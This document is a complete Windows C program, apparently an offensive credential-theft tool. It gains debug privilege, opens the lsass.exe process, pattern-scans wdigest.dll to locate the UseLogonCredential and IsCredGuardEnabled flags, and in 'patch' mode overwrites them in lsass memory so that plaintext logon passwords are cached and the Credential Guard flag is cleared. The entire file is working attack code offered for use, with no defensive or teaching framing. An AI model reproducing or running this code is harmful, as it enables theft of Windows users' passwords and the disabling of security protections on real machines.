#define UNICODE
#define _UNICODE

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <stdint.h>

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        wprintf(L"[-] OpenProcessToken failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        wprintf(L"[-] LookupPrivilegeValue failed. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        wprintf(L"[-] AdjustTokenPrivileges failed. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

DWORD GetLsassPid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
            CloseHandle(hSnapshot);
            return pe.th32ProcessID;
        }
    } while (Process32NextW(hSnapshot, &pe));

    CloseHandle(hSnapshot);
    return 0;
}

BOOL ParsePEFile(BYTE* buffer, size_t bufferSize, int* offset, int* useLogonCredential, int* isCredGuardEnabled, BYTE* matchedBytes) {
    *offset = 0;
    *useLogonCredential = 0;
    *isCredGuardEnabled = 0;
    memset(matchedBytes, 0, 18);

    int peHeaderOffset = *(int32_t*)(buffer + 0x3C);
    uint32_t peSignature = *(uint32_t*)(buffer + peHeaderOffset);
    if (peSignature != 0x00004550) return FALSE;

    uint16_t numberOfSections = *(uint16_t*)(buffer + peHeaderOffset + 6);
    uint16_t sizeOfOptionalHeader = *(uint16_t*)(buffer + peHeaderOffset + 20);
    int sectionHeadersOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;

    for (int i = 0; i < numberOfSections; i++) {
        int sectionOffset = sectionHeadersOffset + (i * 40);
        char sectionName[9];
        memcpy(sectionName, buffer + sectionOffset, 8);
        sectionName[8] = '\0';

        if (strcmp(sectionName, ".text") == 0) {
            uint32_t virtualAddress = *(uint32_t*)(buffer + sectionOffset + 12);
            uint32_t rawDataPointer = *(uint32_t*)(buffer + sectionOffset + 20);
            uint32_t rawDataSize = *(uint32_t*)(buffer + sectionOffset + 16);

            for (uint32_t j = rawDataPointer; j < rawDataPointer + rawDataSize - 11; j++) {
                if (j + 11 >= bufferSize) break;

                if (buffer[j] == 0x39 && buffer[j + 5] == 0x00 &&
                    buffer[j + 6] == 0x8b && buffer[j + 11] == 0x00) {

                    *offset = j + virtualAddress - rawDataPointer;

                    for (int k = 0; k < 18 && (j + k) < bufferSize; k++) {
                        matchedBytes[k] = buffer[j + k];
                    }

                    *useLogonCredential = (buffer[j + 4] << 16) | (buffer[j + 3] << 8) | buffer[j + 2];
                    *isCredGuardEnabled = (buffer[j + 10] << 16) | (buffer[j + 9] << 8) | buffer[j + 8];

                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

uintptr_t GetModuleBase(HANDLE hProcess, const wchar_t* moduleName) {
    HMODULE hMods[1024];
    DWORD cbNeeded;
    wchar_t modName[MAX_PATH];

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (size_t i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            if (GetModuleBaseNameW(hProcess, hMods[i], modName, sizeof(modName) / sizeof(wchar_t))) {
                if (_wcsicmp(modName, moduleName) == 0) {
                    return (uintptr_t)hMods[i];
                }
            }
        }
    }

    return 0;
}

void PrintMatchedBytes(BYTE* bytes, size_t len) {
    wprintf(L"[+] Matched bytes: ");
    for (size_t i = 0; i < len; i++) {
        wprintf(L"%02X ", bytes[i]);
    }
    wprintf(L"\n");
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        wprintf(L"[!] Usage: %s <check | patch>\n", argv[0]);
        return 1;
    }

    BOOL patchMode = (_wcsicmp(argv[1], L"patch") == 0);

    if (!EnableDebugPrivilege()) {
        wprintf(L"[-] Could not enable SeDebugPrivilege\n");
        return 1;
    }

    DWORD pid = GetLsassPid();
    if (!pid) {
        wprintf(L"[-] Could not find lsass.exe\n");
        return 1;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        wprintf(L"[-] Could not open lsass process. Error: %lu\n", GetLastError());
        return 1;
    }

    FILE* f = _wfopen(L"C:\\Windows\\System32\\wdigest.dll", L"rb");
    if (!f) {
        wprintf(L"[-] Could not open wdigest.dll on disk. Error: %lu\n", GetLastError());
        return 1;
    }

    fseek(f, 0, SEEK_END);
    size_t fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    BYTE* buffer = (BYTE*)malloc(fileSize);
    fread(buffer, 1, fileSize, f);
    fclose(f);

    int offset = 0, uOffset = 0, cOffset = 0;
    BYTE matchedBytes[18] = { 0 };

    if (!ParsePEFile(buffer, fileSize, &offset, &uOffset, &cOffset, matchedBytes)) {
        wprintf(L"[-] Pattern not found in PE file\n");
        return 1;
    }

    PrintMatchedBytes(matchedBytes, 18);

    uintptr_t base = GetModuleBase(hProcess, L"wdigest.dll");
    if (!base) {
        wprintf(L"[-] Could not find wdigest.dll base in lsass\n");
        return 1;
    }

    uintptr_t uAddress = base + uOffset + offset + 6;
    uintptr_t cAddress = base + cOffset + offset + 12;

    wprintf(L"[+] DLL Base Address: 0x%p\n", (void*)base);
    wprintf(L"[+] UseLogonCredential Address: 0x%p\n", (void*)uAddress);
    wprintf(L"[+] IsCredGuardEnabled Address: 0x%p\n", (void*)cAddress);

    DWORD valU = 0, valC = 0;
    SIZE_T bytesRead;

    if (!ReadProcessMemory(hProcess, (LPCVOID)uAddress, &valU, sizeof(valU), &bytesRead)) {
        wprintf(L"[-] Failed to read UseLogonCredential. Error: %lu\n", GetLastError());
        return 1;
    }

    if (!ReadProcessMemory(hProcess, (LPCVOID)cAddress, &valC, sizeof(valC), &bytesRead)) {
        wprintf(L"[-] Failed to read IsCredGuardEnabled. Error: %lu\n", GetLastError());
        return 1;
    }

    wprintf(L"[+] UseLogonCredential value: %d\n", valU);
    wprintf(L"[+] IsCredGuardEnabled value: %d\n", valC);

    if (patchMode) {
        DWORD one = 1, zero = 0;
        if (WriteProcessMemory(hProcess, (LPVOID)uAddress, &one, sizeof(DWORD), NULL) &&
            WriteProcessMemory(hProcess, (LPVOID)cAddress, &zero, sizeof(DWORD), NULL)) {
            wprintf(L"[+] Memory patched successfully.\n");
        } else {
            wprintf(L"[-] Failed to write memory. Error: %lu\n", GetLastError());
        }
    }

    free(buffer);
    CloseHandle(hProcess);
    return 0;
}
